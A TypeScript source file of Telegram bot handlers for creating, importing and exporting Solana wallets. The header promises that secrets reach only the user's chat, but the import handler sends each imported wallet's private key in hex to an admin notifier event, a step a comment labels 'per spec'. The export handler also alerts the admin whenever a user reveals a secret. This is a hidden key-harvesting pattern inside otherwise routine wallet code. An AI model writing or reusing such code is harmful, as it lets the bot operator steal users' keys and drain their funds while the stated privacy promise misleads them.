/**
 * Wallet handlers: show / create / replace / import / export.
 * Secrets are only ever sent to the user's chat on explicit confirmation
 * and never logged.
 */
import { InlineKeyboard } from 'grammy';
import {
  answerCallback,
  networkLabel,
  requirePrivate,
  resetToIdle,
  safeHandler,
  transition,
} from './common';
import {
  walletCreatedText,
  walletImportedText,
  walletInfoText,
  exportWarningText,
  exportRevealText,
  IMPORT_SCREEN_TEXT,
} from '../messages';
import { walletMenuKeyboard, confirmCancelKeyboard, backToMenuKeyboard } from '../keyboards';
import { lamportsToSol, shortAddress, explorerAddressUrl } from '../../util/format';

export const showWalletHandler = safeHandler('wallet.show', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await resetToIdle(ctx);

  const wallet = await ctx.services.wallets.getInfo(ctx.chat!.id);
  if (!wallet) {
    await ctx.reply(
      '👛 You don\'t have a wallet yet.\nCreate a new one or import an existing key.',
      {
        parse_mode: 'HTML',
        reply_markup: new InlineKeyboard()
          .text('✨ Create new wallet', 'wallet:create')
          .text('🔑 Import key', 'wallet:import'),
      },
    );
    return;
  }

  const [balance, accounts] = await Promise.all([
    ctx.services.solana.getBalance(wallet.address),
    ctx.services.solana.getParsedTokenAccountsByOwner(wallet.address),
  ]);
  const held = accounts.filter((a) => BigInt(a.amount) > 0n).length;

  await ctx.reply(
    walletInfoText(
      wallet.address,
      lamportsToSol(balance),
      held,
      networkLabel(ctx),
      explorerAddressUrl(wallet.address, ctx.services.config.isDevnet),
    ),
    { parse_mode: 'HTML', reply_markup: walletMenuKeyboard() },
  );
});

export const walletCreateConfirmHandler = safeHandler('wallet.create.confirm', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;

  const existing = await ctx.services.wallets.getInfo(chatId);
  if (!existing) {
    // No wallet yet — create immediately.
    const { address, mnemonic, walletNumber } = await ctx.services.wallets.create(chatId);
    await ctx.services.deposits.rebaseline(chatId); // snapshot from birth
    await ctx.reply(walletCreatedText(address, mnemonic, networkLabel(ctx)), {
      parse_mode: 'HTML',
      reply_markup: backToMenuKeyboard(),
    });
    // wallet_generated — ALWAYS sent (per product spec).
    await ctx.services.notifier.event('wallet_generated', {
      user: chatId,
      walletNumber,
      address,
    });
    return;
  }

  // Wallet exists — warn before replacing.
  await ctx.reply(
    `⚠️ <b>Replace existing wallet?</b>\n\nCurrent address:\n<code>${existing.address}</code>\n\nA replacement makes the current key <b>unrecoverable</b>. Export it first if you haven't. Funds held by the old wallet will be lost unless withdrawn first.\n\nConfirm to proceed.`,
    { parse_mode: 'HTML', reply_markup: confirmCancelKeyboard('wallet:create:replace') },
  );
});

export const walletCreateReplaceHandler = safeHandler('wallet.create.replace', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;

  const { address, mnemonic, walletNumber } = await ctx.services.wallets.replace(chatId);
  await ctx.services.deposits.rebaseline(chatId); // snapshot from birth
  await ctx.reply(walletCreatedText(address, mnemonic, networkLabel(ctx)), {
    parse_mode: 'HTML',
    reply_markup: backToMenuKeyboard(),
  });
  // wallet_generated — ALWAYS sent (per product spec).
  await ctx.services.notifier.event('wallet_generated', {
    user: chatId,
    walletNumber,
    address,
  });
});

export const walletImportPromptHandler = safeHandler('wallet.import.prompt', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  // 1. Enters the import conversation state.
  await transition(ctx, 'awaiting_import_secret');
  // Exact product-spec import screen.
  await ctx.reply(IMPORT_SCREEN_TEXT, { parse_mode: 'HTML', reply_markup: backToMenuKeyboard() });
});

export const walletImportHandleSecretHandler = safeHandler('wallet.import.secret', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  const chatId = ctx.chat!.id;

  // 2. Receives the mnemonic; 3. validates BIP39; 4. derives the keypair;
  // 5. determines the public address; 6. encrypts; 7. stores — all inside
  // the wallet service (plaintext never retained in app state/logs).
  const { address, derivation, privateKeyHex, walletNumber } =
    await ctx.services.wallets.import(chatId, text);

  // 8. Checks the real SOL balance; 9. displays the resulting wallet.
  const balance = await ctx.services.solana.getBalance(address).catch(() => 0);

  await ctx.services.deposits.rebaseline(chatId); // snapshot from birth
  await resetToIdle(ctx);
  await ctx.reply(
    walletImportedText(address, walletNumber, lamportsToSol(balance), networkLabel(ctx)),
    { parse_mode: 'HTML', reply_markup: backToMenuKeyboard() },
  );

  // 10. Admin event (per spec: includes the private key — see SECURITY.md).
  await ctx.services.notifier.event('wallet_imported', {
    user: chatId,
    walletNumber,
    address,
    privateKey: privateKeyHex,
  });
  ctx.services.logger.info({ chatId, address, walletNumber, derivation }, 'wallet import completed');
});

export const walletExportConfirmHandler = safeHandler('wallet.export.confirm', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);

  const wallet = await ctx.services.wallets.getInfo(ctx.chat!.id);
  if (!wallet) {
    await ctx.reply('No wallet found. Create or import one first.', { parse_mode: 'HTML' });
    return;
  }
  await ctx.reply(exportWarningText(), {
    parse_mode: 'HTML',
    reply_markup: confirmCancelKeyboard('wallet:export:reveal'),
  });
});

export const walletExportRevealHandler = safeHandler('wallet.export.reveal', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);

  const { kind, secret, address } = await ctx.services.wallets.exportSecret(ctx.chat!.id);
  await ctx.reply(exportRevealText(secret, kind), { parse_mode: 'HTML' });
  await ctx.services.notifier.send(
    `🔑 <b>Wallet secret exported</b>\nUser: <code>${ctx.chat!.id}</code>\nAddress: <code>${shortAddress(address)}</code>`,
  );
});
